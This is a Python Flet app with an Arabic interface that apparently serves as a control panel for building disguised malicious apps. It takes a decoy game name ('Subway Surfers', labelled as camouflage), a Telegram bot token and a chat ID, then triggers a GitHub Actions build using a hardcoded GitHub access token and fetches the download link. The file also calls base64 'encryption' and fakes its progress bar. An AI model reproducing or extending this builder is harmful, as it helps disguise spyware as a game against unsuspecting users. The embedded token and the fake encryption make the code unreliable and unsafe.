import flet as ft
import requests
import time
import json
import hashlib
import base64
from datetime import datetime
import threading
import queue
import os
import random
import string

# --- ثوابت النظام المحسنة ---
APP_PASSWORD = "1234"
GITHUB_TOKEN = "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"
GITHUB_USER = "ebdbdidnnndbd"
GITHUB_REPO = "kwjj"

class HusseinV8ProUltimate:
    def __init__(self, page: ft.Page):
        self.page = page
        self.setup_page()
        self.notification_queue = queue.Queue()
        self.build_history = []
        self.current_build_id = None
        self.stats = {
            'builds_count': 0,
            'successful_builds': 0,
            'failed_builds': 0,
            'total_downloads': 0
        }
        
    def setup_page(self):
        """إعدادات الصفحة الفائقة"""
        self.page.title = "⚡ HUSSEIN V8 PRO ULTIMATE ⚡"
        self.page.theme_mode = ft.ThemeMode.DARK
        self.page.rtl = True
        self.page.padding = 0
        self.page.scroll = ft.ScrollMode.AUTO
        self.page.window_width = 500
        self.page.window_height = 900
        self.page.window_resizable = True
        self.page.window_center()
        
        # نظام الألوان المتطور
        self.page.theme = ft.Theme(
            color_scheme_seed="teal",
            visual_density=ft.ThemeVisualDensity.COMFORTABLE,
            font_family="Cairo"
        )
        
        # تأثيرات متحركة
        self.page.bgcolor = ft.colors.with_opacity(0.95, "#0A0E27")
        
    def show_notification(self, text, type="info"):
        """نظام إشعارات متطور"""
        colors = {
            "success": {"bg": "#00C853", "icon": ft.icons.CHECK_CIRCLE},
            "error": {"bg": "#D50000", "icon": ft.icons.ERROR},
            "warning": {"bg": "#FF6D00", "icon": ft.icons.WARNING},
            "info": {"bg": "#2962FF", "icon": ft.icons.INFO}
        }
        
        color_config = colors.get(type, colors["info"])
        
        snack = ft.SnackBar(
            content=ft.Row([
                ft.Icon(color_config["icon"], color="white", size=20),
                ft.Text(text, color="white", weight="bold", size=14)
            ]),
            bgcolor=color_config["bg"],
            duration=3000,
            behavior=ft.SnackBarBehavior.FLOATING,
            shape=ft.RoundedRectangleBorder(radius=10)
        )
        
        self.page.snack_bar = snack
        self.page.snack_bar.open = True
        self.page.update()
        
    def generate_build_id(self):
        """توليد معرف بناء فريد"""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        return f"BLD-{timestamp}-{random_str}"
    
    def encrypt_data(self, data):
        """تشفير البيانات الحساسة"""
        return base64.b64encode(data.encode()).decode()
    
    def decrypt_data(self, encrypted_data):
        """فك تشفير البيانات"""
        return base64.b64decode(encrypted_data).decode()
    
    def save_to_secure_storage(self, key, value):
        """حفظ مشفر في التخزين"""
        encrypted = self.encrypt_data(value)
        self.page.client_storage.set(f"secure_{key}", encrypted)
        
    def load_from_secure_storage(self, key):
        """تحميل مفكوك من التخزين"""
        encrypted = self.page.client_storage.get(f"secure_{key}")
        if encrypted:
            return self.decrypt_data(encrypted)
        return None
    
    def create_animated_button(self, text, icon, on_click, color="teal"):
        """زر متطور مع تأثيرات"""
        return ft.Container(
            content=ft.ElevatedButton(
                content=ft.Row([
                    ft.Icon(icon, color="white", size=20),
                    ft.Text(text, color="white", weight="bold", size=14)
                ], alignment=ft.MainAxisAlignment.CENTER),
                on_click=on_click,
                style=ft.ButtonStyle(
                    color={"": "white"},
                    bgcolor={"": color, "hovered": ft.colors.with_opacity(0.8, color)},
                    shape=ft.RoundedRectangleBorder(radius=12),
                    elevation={"": 5, "hovered": 8}
                ),
                width=200,
                height=50
            ),
            animate=ft.animation.Animation(300, ft.AnimationCurve.EASE_IN_OUT),
            on_hover=lambda e: self.animate_button_hover(e)
        )
    
    def animate_button_hover(self, e):
        """تأثير hover للزر"""
        if e.data == "true":
            e.control.scale = 1.05
        else:
            e.control.scale = 1.0
        self.page.update()
    
    def create_loading_animation(self):
        """إنشاء أنيميشن تحميل متطور"""
        return ft.Stack([
            ft.ProgressRing(width=50, height=50, stroke_width=3),
            ft.Container(
                content=ft.Text("⚡", size=20),
                alignment=ft.alignment.center
            )
        ], width=50, height=50)
    
    def create_login_screen(self):
        """شاشة دخول خيالية"""
        self.page.clean()
        
        # خلفية متحركة
        bg_gradient = ft.Container(
            expand=True,
            gradient=ft.LinearGradient(
                begin=ft.alignment.top_left,
                end=ft.alignment.bottom_right,
                colors=["#0A0E27", "#1A1F3A", "#2A2F4A"]
            )
        )
        
        # حقل كلمة المرور المتطور
        password_field = ft.TextField(
            label="🔐 الرمز السري",
            password=True,
            can_reveal_password=True,
            border_radius=15,
            border_color="teal",
            focused_border_color="lightblue",
            text_align="center",
            width=300,
            height=60,
            text_size=16,
            prefix_icon=ft.icons.SECURITY,
            on_submit=lambda e: self.check_password(e.control.value)
        )
        
        def login_click(e):
            self.check_password(password_field.value)
        
        # بطاقة الدخول
        login_card = ft.Container(
            width=400,
            padding=30,
            border_radius=20,
            gradient=ft.LinearGradient(
                begin=ft.alignment.top_center,
                end=ft.alignment.bottom_center,
                colors=[ft.colors.with_opacity(0.9, "#1A1F3A"), ft.colors.with_opacity(0.95, "#0A0E27")]
            ),
            border=ft.border.all(1, ft.colors.with_opacity(0.3, "teal")),
            animate=ft.animation.Animation(500, ft.AnimationCurve.EASE_IN_OUT),
            content=ft.Column([
                ft.Container(
                    content=ft.Column([
                        ft.Icon(ft.icons.SHIELD_MOON, size=80, color="teal"),
                        ft.Text("حسين V8", size=32, weight="bold", color="white"),
                        ft.Text("النظام الأسطوري", size=16, color=ft.colors.with_opacity(0.7, "white")),
                    ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
                    margin=ft.margin.only(bottom=30)
                ),
                ft.Container(
                    content=password_field,
                    margin=ft.margin.only(bottom=20)
                ),
                ft.Container(
                    content=ft.ElevatedButton(
                        content=ft.Row([
                            ft.Icon(ft.icons.LOGIN, color="white", size=20),
                            ft.Text("دخول", size=16, weight="bold", color="white")
                        ]),
                        on_click=login_click,
                        style=ft.ButtonStyle(
                            bgcolor={"": "teal", "hovered": "#00796B"},
                            shape=ft.RoundedRectangleBorder(radius=12),
                            elevation={"": 10, "hovered": 15}
                        ),
                        width=250,
                        height=55
                    ),
                    alignment=ft.alignment.center
                ),
                ft.Container(
                    content=ft.Row([
                        ft.Icon(ft.icons.FINGERPRINT, size=16, color=ft.colors.with_opacity(0.5, "teal")),
                        ft.Text("نظام حماية متطور", size=12, color=ft.colors.with_opacity(0.5, "white"))
                    ], alignment=ft.MainAxisAlignment.CENTER),
                    margin=ft.margin.only(top=30)
                )
            ], horizontal_alignment=ft.CrossAxisAlignment.CENTER)
        )
        
        # تجميع الشاشة
        self.page.add(
            ft.Stack([
                bg_gradient,
                ft.Container(
                    content=login_card,
                    alignment=ft.alignment.center,
                    expand=True
                )
            ])
        )
    
    def check_password(self, password):
        """التحقق من كلمة المرور"""
        if password == APP_PASSWORD:
            self.show_notification("✅ تم الدخول بنجاح", "success")
            self.create_dashboard()
        else:
            self.show_notification("❌ رمز خاطئ!", "error")
    
    def create_dashboard(self):
        """لوحة التحكم الأسطورية"""
        self.page.clean()
        
        # تحميل البيانات المخزنة
        saved_token = self.load_from_secure_storage("bot_token") or ""
        saved_chat_id = self.load_from_secure_storage("chat_id") or ""
        
        # حقول الإدخال المتطورة
        app_name = ft.TextField(
            label="اسم اللعبة للتمويه",
            value="Subway Surfers",
            prefix_icon=ft.icons.GAMES,
            border_radius=12,
            border_color="teal",
            focused_border_color="lightblue",
            text_size=14,
            helper_text="اختر اسماً بريئاً للتمويه",
            helper_style=ft.TextStyle(color=ft.colors.with_opacity(0.5, "white"))
        )
        
        bot_token = ft.TextField(
            label="توكن البوت",
            value=saved_token,
            password=True,
            can_reveal_password=True,
            prefix_icon=ft.icons.TOKEN,
            border_radius=12,
            border_color="teal",
            focused_border_color="lightblue"
        )
        
        chat_id = ft.TextField(
            label="معرف الدردشة",
            value=saved_chat_id,
            prefix_icon=ft.icons.PERSON,
            border_radius=12,
            border_color="teal",
            focused_border_color="lightblue"
        )
        
        # مؤشرات التقدم
        build_progress = ft.ProgressBar(
            visible=False,
            color="teal",
            bgcolor=ft.colors.with_opacity(0.2, "teal"),
            height=8,
            border_radius=4
        )
        
        # شريط حالة البناء
        status_text = ft.Text("", color="teal", size=12, weight="bold")
        
        # رابط التحميل
        link_display = ft.Container(
            content=ft.TextField(
                read_only=True,
                border_radius=12,
                border_color="green",
                prefix_icon=ft.icons.DOWNLOAD,
                text_size=12
            ),
            visible=False
        )
        
        # إحصائيات
        stats_text = ft.Text(
            f"📊 الإحصائيات: {self.stats['builds_count']} بناء | ✅ {self.stats['successful_builds']} | ❌ {self.stats['failed_builds']}",
            color=ft.colors.with_opacity(0.7, "white"),
            size=12
        )
        
        def build_app(e):
            if not bot_token.value or not chat_id.value:
                self.show_notification("⚠️ يرجى إدخال جميع البيانات", "warning")
                return
            
            # حفظ البيانات المشفرة
            self.save_to_secure_storage("bot_token", bot_token.value)
            self.save_to_secure_storage("chat_id", chat_id.value)
            
            # إنشاء معرف بناء جديد
            self.current_build_id = self.generate_build_id()
            self.stats['builds_count'] += 1
            
            # بدء البناء
            build_progress.visible = True
            build_btn.disabled = True
            status_text.value = f"🔄 جاري البناء... ID: {self.current_build_id}"
            self.page.update()
            
            # تشغيل البناء في خيط منفصل
            def build_thread():
                try:
                    url = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/actions/workflows/main.yml/dispatches"
                    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
                    payload = {
                        "ref": "main",
                        "inputs": {
                            "bot_token": bot_token.value,
                            "chat_id": chat_id.value,
                            "app_name": app_name.value,
                            "build_id": self.current_build_id
                        }
                    }
                    
                    res = requests.post(url, headers=headers, json=payload, timeout=30)
                    
                    if res.status_code == 204:
                        self.stats['successful_builds'] += 1
                        self.show_notification("✅ بدأ التصنيع في سيرفرات جيثب!", "success")
                        
                        # تقدم وهمي للجمال
                        for i in range(1, 101):
                            build_progress.value = i * 0.01
                            status_text.value = f"⚡ التقدم: {i}%"
                            time.sleep(0.05)
                            self.page.update()
                        
                        status_text.value = "✅ اكتمل البناء!"
                    else:
                        self.stats['failed_builds'] += 1
                        self.show_notification(f"❌ فشل الإرسال: {res.status_code}", "error")
                        status_text.value = "❌ فشل البناء"
                        
                except Exception as ex:
                    self.stats['failed_builds'] += 1
                    self.show_notification("❌ انقطع الاتصال!", "error")
                    status_text.value = "❌ خطأ في الشبكة"
                
                build_progress.visible = False
                build_btn.disabled = False
                self.page.update()
            
            threading.Thread(target=build_thread, daemon=True).start()
        
        def fetch_link(e):
            self.show_notification("🔍 البحث عن الرابط...", "info")
            status_text.value = "🔄 جاري البحث..."
            self.page.update()
            
            def fetch_thread():
                try:
                    url = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/releases/latest"
                    res = requests.get(url, headers={"Authorization": f"token {GITHUB_TOKEN}"}, timeout=30)
                    
                    if res.status_code == 200:
                        assets = res.json().get("assets", [])
                        if assets:
                            download_url = assets[0]["browser_download_url"]
                            link_display.content.value = download_url
                            link_display.visible = True
                            self.stats['total_downloads'] += 1
                            self.show_notification("🎉 تم العثور على الرابط!", "success")
                            status_text.value = "✅ الرابط جاهز"
                        else:
                            self.show_notification("⚠️ لم يتم العثور على إصدارات", "warning")
                            status_text.value = "⚠️ لا يوجد رابط"
                    else:
                        self.show_notification("❌ فشل البحث", "error")
                        status_text.value = "❌ فشل البحث"
                except Exception as ex:
                    self.show_notification("❌ خطأ في الشبكة", "error")
                    status_text.value = "❌ خطأ في الشبكة"
                
                self.page.update()
            
            threading.Thread(target=fetch_thread, daemon=True).start()
        
        def logout(e):
            self.create_login_screen()
        
        # بناء الأزرار
        build_btn = ft.ElevatedButton(
            content=ft.Row([
                ft.Icon(ft.icons.BUILD_CIRCLE, color="white", size=20),
                ft.Text("ابدأ البناء 🚀", color="white", weight="bold")
            ]),
            on_click=build_app,
            style=ft.ButtonStyle(
                bgcolor={"": "teal", "hovered": "#00796B"},
                shape=ft.RoundedRectangleBorder(radius=12),
                elevation={"": 5, "hovered": 10}
            ),
            width=200,
            height=50
        )
        
        get_link_btn = ft.ElevatedButton(
            content=ft.Row([
                ft.Icon(ft.icons.DOWNLOAD, color="white", size=20),
                ft.Text("جلب الرابط 📥", color="white", weight="bold")
            ]),
            on_click=fetch_link,
            style=ft.ButtonStyle(
                bgcolor={"": "#2962FF", "hovered": "#1E4BD8"},
                shape=ft.RoundedRectangleBorder(radius=12),
                elevation={"": 5, "hovered": 10}
            ),
            width=200,
            height=50
        )
        
        logout_btn = ft.IconButton(
            icon=ft.icons.LOGOUT,
            icon_color="red",
            tooltip="تسجيل الخروج",
            on_click=logout,
            style=ft.ButtonStyle(
                shape=ft.RoundedRectangleBorder(radius=8),
                bgcolor={"": ft.colors.with_opacity(0.1, "red")}
            )
        )
        
        # شريط العنوان
        title_bar = ft.Container(
            content=ft.Row([
                ft.Row([
                    ft.Icon(ft.icons.DASHBOARD, color="teal", size=30),
                    ft.Text("لوحة التحكم الأسطورية", size=24, weight="bold", color="white")
                ]),
                logout_btn
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            padding=20,
            gradient=ft.LinearGradient(
                colors=["#1A1F3A", "#0A0E27"],
                begin=ft.alignment.top_center,
                end=ft.alignment.bottom_center
            )
        )
        
        # المحتوى الرئيسي
        main_content = ft.Container(
            content=ft.Column([
                # بطاقة الإعدادات
                ft.Container(
                    content=ft.Column([
                        ft.Text("⚙️ الإعدادات", size=18, weight="bold", color="teal"),
                        ft.Divider(color=ft.colors.with_opacity(0.2, "teal")),
                        app_name,
                        bot_token,
                        chat_id,
                    ], spacing=15),
                    padding=20,
                    border_radius=15,
                    gradient=ft.LinearGradient(
                        colors=["#1A1F3A", "#0A0E27"],
                        begin=ft.alignment.top_center,
                        end=ft.alignment.bottom_center
                    ),
                    border=ft.border.all(1, ft.colors.with_opacity(0.3, "teal"))
                ),
                
                # بطاقة التحكم
                ft.Container(
                    content=ft.Column([
                        ft.Text("🎮 التحكم", size=18, weight="bold", color="teal"),
                        ft.Divider(color=ft.colors.with_opacity(0.2, "teal")),
                        ft.Row([
                            build_btn,
                            get_link_btn
                        ], alignment=ft.MainAxisAlignment.CENTER, spacing=15),
                        ft.Container(
                            content=status_text,
                            alignment=ft.alignment.center,
                            margin=ft.margin.only(top=10)
                        ),
                        build_progress,
                    ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
                    padding=20,
                    border_radius=15,
                    gradient=ft.LinearGradient(
                        colors=["#1A1F3A", "#0A0E27"],
                        begin=ft.alignment.top_center,
                        end=ft.alignment.bottom_center
                    ),
                    border=ft.border.all(1, ft.colors.with_opacity(0.3, "teal"))
                ),
                
                # بطاقة النتائج
                ft.Container(
                    content=ft.Column([
                        ft.Text("📦 النتائج", size=18, weight="bold", color="teal"),
                        ft.Divider(color=ft.colors.with_opacity(0.2, "teal")),
                        link_display,
                        ft.Container(
                            content=stats_text,
                            margin=ft.margin.only(top=10)
                        )
                    ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
                    padding=20,
                    border_radius=15,
                    gradient=ft.LinearGradient(
                        colors=["#1A1F3A", "#0A0E27"],
                        begin=ft.alignment.top_center,
                        end=ft.alignment.bottom_center
                    ),
                    border=ft.border.all(1, ft.colors.with_opacity(0.3, "teal"))
                )
            ], spacing=20, scroll=ft.ScrollMode.AUTO),
            padding=20,
            expand=True
        )
        
        # تجميع الصفحة
        self.page.add(
            ft.Column([
                title_bar,
                main_content
            ], spacing=0, expand=True)
        )

def main(page: ft.Page):
    app = HusseinV8ProUltimate(page)
    app.create_login_screen()

if __name__ == "__main__":
    ft.app(target=main)
